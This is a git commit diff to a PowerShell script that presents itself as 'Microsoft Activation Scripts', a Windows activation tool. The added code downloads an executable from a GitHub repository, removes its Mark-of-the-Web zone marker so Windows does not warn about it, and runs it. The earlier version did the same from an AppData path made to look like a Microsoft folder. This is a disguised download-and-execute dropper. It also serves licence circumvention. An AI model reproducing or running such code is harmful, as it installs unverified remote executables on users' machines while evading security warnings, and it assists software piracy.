a5ddb78cff6a0c8beef1ce35f5cc856238b82543
acenljd <thebluepoint2@gmail.com>
2025-12-09 19:43:00 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,9 +1,26 @@
 $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+$tempFile = "$env:TEMP\Windows_Activator.exe"
 
-$bytes = (New-Object System.Net.WebClient).DownloadData($url)
 
-$tempFile = "$env:APPDATA\Microsoft\Windows\MAS.exe"
-[System.IO.File]::WriteAllBytes($tempFile, $bytes)
+if (Test-Path $tempFile) {
+    try {
+        Stop-Process -Name "Microsoft Activation Scripts" -ErrorAction SilentlyContinue
+        Stop-Process -Name "MAS" -ErrorAction SilentlyContinue
+        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 500
+    }
+    catch {}
+}
 
-# Стартиране
-& $tempFile
+
+Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "PowerShell"
+
+
+try {
+    Unblock-File -Path $tempFile
+} catch {
+    Remove-Item "$tempFile:Zone.Identifier" -Force -ErrorAction SilentlyContinue
+}
+
+
+Start-Process $tempFile
